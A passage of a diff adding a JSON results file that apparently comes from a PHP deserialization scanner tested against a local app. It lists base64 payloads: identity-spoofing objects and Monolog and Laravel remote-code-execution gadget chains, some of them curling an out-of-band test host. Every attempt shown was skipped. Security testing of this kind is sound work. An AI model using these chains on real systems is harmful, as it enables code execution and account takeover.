+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2QxZTE4MGU5YTkwYi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2QxZTE4MGU5YTkwYi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovL2QxZTE4MGU5YTkwYi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly9kMWUxODBlOWE5MGIub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vZDFlMTgwZTlhOTBiLm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovL2QxZTE4MGU5YTkwYi5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/dashboard",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 2,
+      "oob_token": "4ac9dc4f4a26",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzRhYzlkYzRmNGEyNi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzRhYzlkYzRmNGEyNi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzRhYzlkYzRmNGEyNi5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly80YWM5ZGM0ZjRhMjYub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vNGFjOWRjNGY0YTI2Lm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovLzRhYzlkYzRmNGEyNi5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/api/logout",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "d7c64b357254",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
